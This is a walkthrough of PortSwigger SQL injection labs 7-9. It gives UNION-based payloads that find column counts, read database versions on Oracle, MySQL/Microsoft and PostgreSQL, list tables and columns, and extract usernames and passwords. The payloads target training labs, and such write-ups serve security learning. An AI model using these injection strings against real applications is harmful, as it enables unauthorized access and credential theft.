# SQL Injection Part 3: Portswigger Labs
### [Lab 7: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

**To solve: Display the database version**

**STEP 1:**
Find number of colums
```html
' order by 3 --
```

**STEP 2:**
Find columns that contains text
```html
' UNION SELECT 'a', 'a' from DUAL--
```

**STEP 3:**
Print the version of the database
```html
' UNION SELECT banner, NULL from v$version--
```

### [Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

**To solve: Display the database version string.**

**STEP 1:**
Find number of colums
```html
' order by 3#
```

**STEP 2:**
Find column that contains text
```html
' UNION SELECT 'a', 'a'#
```

**STEP 3:**
Display the version
```html
' UNION SELECT @@version, NULL#
```

### [Lab 9: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
**To solve: Login as administrator**

**STEP 1:**
Find number of column returned
```html
'+UNION+SELECT+NULL,NULL--
```

**STEP 2:**
Find column that contains text
```html
' UNION select 'aff', 'asd'--
```

**STEP 3:**
Version of database(PostgreSQL)
```html
' UNION SELECT version(), NULL--
```

**STEP 4:**
List of tables name
```html
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**STEP 5:**
List the name of columns
```html
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_RANDOM'--
```

**STEP 6:**
Finally output the name and the password
```html
' UNION select username_RANDOM, password_RANDOM from users_RANDOM--
```
